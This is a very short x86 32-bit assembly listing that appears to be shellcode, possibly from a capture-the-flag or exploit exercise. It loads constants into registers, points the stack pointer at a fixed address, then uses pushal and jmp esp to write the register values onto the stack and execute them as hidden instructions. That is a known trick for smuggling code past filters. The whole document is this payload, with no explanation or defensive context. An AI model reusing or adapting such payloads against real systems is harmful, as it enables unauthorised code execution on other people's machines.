; kaploombaa
.arch x86
.bits 32
mov eax, 0x00004000
mov ebx, 0x0003fcff
mov edi, 0x000070bc
mov esi, 0x21c70100
mov ebp, 0xe4ff60df
mov esp, 0x40
pushal
jmp esp
